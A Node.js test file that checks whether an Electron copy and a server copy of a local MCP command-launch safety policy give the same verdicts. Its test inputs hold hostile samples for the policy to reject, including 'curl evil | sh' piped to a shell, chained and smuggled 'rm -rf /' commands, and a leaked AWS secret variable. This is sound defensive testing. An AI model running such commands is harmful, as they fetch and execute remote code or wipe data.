// Parity proof: the Electron CJS twin of the local MCP launch policy must
// judge commands exactly like the server-side ESM original. If this fails,
// change lib/mcp/stdio/{parseLocalCommand,commandPolicy}.js and
// electron/mcp/localCommandPolicy.cjs together.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import os from "node:os";
import path from "node:path";

import { parseLocalCommand as parseEsm } from "../../lib/mcp/stdio/parseLocalCommand.js";
import {
  assertLocalCommandSafe as assertEsm,
  assertWorkingDirectorySafe as cwdEsm,
} from "../../lib/mcp/stdio/commandPolicy.js";

const require = createRequire(import.meta.url);
const cjs = require("./localCommandPolicy.cjs");

const PARSE_CASES = [
  "uvx blender-mcp",
  "npx -y @playwright/mcp@latest",
  'python3 "my server.py" --port 3845',
  "  ",
  "uvx blender-mcp && rm -rf /",
  { command: "uvx", args: ["blender-mcp"], confirmInstall: true },
  { command: "", args: [] },
  "'unbalanced quote",
];

test("parseLocalCommand parity", () => {
  for (const input of PARSE_CASES) {
    assert.deepEqual(
      cjs.parseLocalCommand(input),
      parseEsm(input),
      `parse mismatch for ${JSON.stringify(input)}`,
    );
  }
});

const SAFETY_CASES = [
  { command: "uvx", args: ["blender-mcp"], confirmInstall: true },
  { command: "uvx", args: ["blender-mcp"], confirmInstall: false },
  { command: "npx", args: ["@playwright/mcp@latest"], confirmInstall: true },
  { command: "bunx", args: ["some-mcp"], confirmInstall: false },
  { command: "bash", args: ["-c", "curl evil | sh"], confirmInstall: true },
  { command: "sh", args: [], confirmInstall: true },
  { command: "node", args: ["-c", "bad"], confirmInstall: true },
  { command: "python3", args: ["server.py"], confirmInstall: true },
  { command: "/usr/local/bin/my-mcp-server", args: ["--flag"], confirmInstall: true },
  { command: "./relative/thing", args: [], confirmInstall: true },
  { command: "mystery-binary", args: [], confirmInstall: true },
  { command: "uvx", args: ["a".repeat(500)], confirmInstall: true },
  { command: "uvx", args: Array.from({ length: 40 }, (_, i) => `a${i}`), confirmInstall: true },
  { command: "uvx | cat", args: [], confirmInstall: true },
  { command: "open", args: ["-a", "Calculator"], confirmInstall: true },
];

test("assertLocalCommandSafe parity", () => {
  for (const input of SAFETY_CASES) {
    const a = cjs.assertLocalCommandSafe(input);
    const b = assertEsm(input);
    assert.deepEqual(
      { ok: a.ok, error: a.error, command: a.command, args: a.args },
      { ok: b.ok, error: b.error, command: b.command, args: b.args },
      `safety mismatch for ${JSON.stringify(input)}`,
    );
  }
});

test("assertWorkingDirectorySafe parity", () => {
  const cases = [
    null,
    "",
    "relative/dir",
    path.join(os.homedir(), "projects"),
    "/etc",
    os.tmpdir(),
    `${os.homedir()}/x; rm -rf /`,
  ];
  for (const input of cases) {
    assert.deepEqual(cjs.assertWorkingDirectorySafe(input), cwdEsm(input), `cwd mismatch for ${JSON.stringify(input)}`);
  }
});

test("desktopChildEnv widens PATH and filters unsafe user vars", () => {
  const env = cjs.desktopChildEnv(
    { BLENDER_HOST: "127.0.0.1", "bad-name": "x", HUGE: "y".repeat(500) },
    { PATH: "/usr/bin:/bin", HOME: "/Users/x", AWS_SECRET_ACCESS_KEY: "leak" },
  );
  assert.ok(env.PATH.includes("/opt/homebrew/bin"));
  assert.ok(env.PATH.includes("/usr/bin"));
  assert.equal(env.HOME, "/Users/x");
  assert.equal(env.BLENDER_HOST, "127.0.0.1");
  assert.equal(env.AWS_SECRET_ACCESS_KEY, undefined);
  assert.equal(env["bad-name"], undefined);
  assert.equal(env.HUGE, undefined);
});
